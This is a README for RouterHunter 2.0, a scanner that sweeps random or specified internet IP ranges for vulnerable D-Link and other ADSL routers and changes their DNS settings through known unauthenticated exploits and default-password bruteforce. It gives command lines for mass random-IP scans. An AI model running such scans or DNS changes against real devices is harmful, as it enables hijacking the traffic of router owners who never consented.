# Scanner Routerhunter 2.0
 Tool used to find vulnerable routers and devices on the Internet and perform tests

```
	          _	          _           _		   		   
  ___ ___ _ _| |_ ___ ___| |_ _ _ ___| |_ ___ ___ 
 |  _| . | | |  _| -_|  _|   | | |   |  _| -_|  _|
 |_| |___|___|_| |___|_| |_|_|___|_|_|_| |___|_|
				       BR - v2.0

 Tool used to find vulnerable routers and devices on the Internet and perform tests.

[ Coded by Jhonathan Davi a.k.a jh00nbr - jhoonbr at protonmail.ch ]
[ fb.com/JhonVipNet - twitter.com/jh00nbr - github.com/jh00nbr/ - blog.inurl.com.br - www.youtube.com/c/Mrsinisterboy ]


[!] legal disclaimer: Usage of RouterHunterBR for attacking targets without prior mutual 
consent is illegal. It is the end user's responsibility to obey all applicable local, state and 
federal laws.Developers assume no liability and are not responsible for any misuse or damage caused
by this program.  
```


 * AUTOR: Jhonathan Davi A.K.A jh00nbr
 * EMAIL*: jhoonbr@protonmail.ch
 * Blog: http://blog.inurl.com.br
 * Twitter: https://twitter.com/jh00nbr
 * Facebook: https://fb.com/JhonVipNet
 * Fanpage: https://fb.com/InurlBrasil
 * Github: https://github.com/jh00nbr/
 * Youtube: https://www.youtube.com/c/Mrsinisterboy


### Description
------
  The script explores four vulnerabilities in routers
 * Shuttle Tech ADSL Modem-Router 915 WM / Unauthenticated Remote DNS Change Exploit            
  reference: http://www.exploit-db.com/exploits/35995/

 * D-Link DSL-2740R / Unauthenticated Remote DNS Change Exploit           
  reference: http://www.exploit-db.com/exploits/35917/

 * D-Link DSL-2640B Unauthenticated Remote DNS Change Exploit            
   reference: http://1337day.com/exploit/23302/ 
 * D-Link DSL-2780B DLink_1.01.14 - Unauthenticated Remote DNS Change           
   reference: https://www.exploit-db.com/exploits/37237/ 

 * D-Link DSL-2730B AU_2.01 - Authentication Bypass DNS Change            
   reference: https://www.exploit-db.com/exploits/37240/ 
 * D-Link DSL-526B ADSL2+ AU_2.01 - Unauthenticated Remote DNS Change           
   reference: https://www.exploit-db.com/exploits/37241/ 

 * DSLink 260E - Authenticated routers - DNS Changer - Bruteforce 
   reference: https://www.youtube.com/watch?v=tNjy91g2Rak                             
   http://blog.inurl.com.br/2015/03/dslink-260e-defaut-passwords-dns-change_17.html 

### Commands

```
Random ips
python routerhunter.py --dns1 8.8.8.8 --dns2 8.8.4.8 --randomip --limitip 10 --threads 10                      
python routerhunter.py --dns1 8.8.8.8 --dns2 8.8.4.8 -rip -lmtip 10 --threads 10

```
![rip](http://i.imgur.com/CAhvz1T.png)

```
Scanner in range ip:
python routerhunter.py --dns1 8.8.8.8 --dns2 8.8.4.8 --range 192.168.25.0-255 --threads 10

```
```
IP range customized with wildcard / Ex: --startip 201.*.*.* -  --endip 201.*.*.*
python routerhunter.py --dns1 8.8.8.8 --dns2 8.8.4.8 --startip 192.168.*.* --endip 192.168.*.* --threads 10
```
